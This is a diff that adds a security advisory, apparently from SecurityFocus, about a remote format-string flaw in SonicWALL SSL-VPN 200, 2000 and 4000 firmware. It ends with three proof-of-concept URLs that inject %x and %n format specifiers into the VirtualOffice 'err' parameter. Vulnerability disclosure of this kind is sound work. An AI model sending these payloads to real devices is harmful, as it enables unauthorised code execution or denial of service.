@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/35145/info
+
+Multiple SonicWALL SSL-VPN devices are prone to a remote format-string vulnerability because they fail to properly sanitize user-supplied input before passing it as the format specifier to a formatted-printing function.
+
+Attackers may exploit this issue to run arbitrary code in the context of the affected application. Failed attempts may cause denial-of-service conditions.
+
+The following are vulnerable:
+
+SSL-VPN 200 firmware prior to 3.0.0.9
+SSL-VPN 2000 firmware prior to 3.5.0.5
+SSL-VPN 4000 firmware prior to 3.5.0.5 
+
+
+https://www.example.com/cgi-bin/welcome/VirtualOffice?err=ABCD%x%x%x
+https://www.example.com/cgi-bin/welcome/VirtualOffice?err=%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+https://www.example.com/cgi-bin/welcome/VirtualOffice?err=%n 
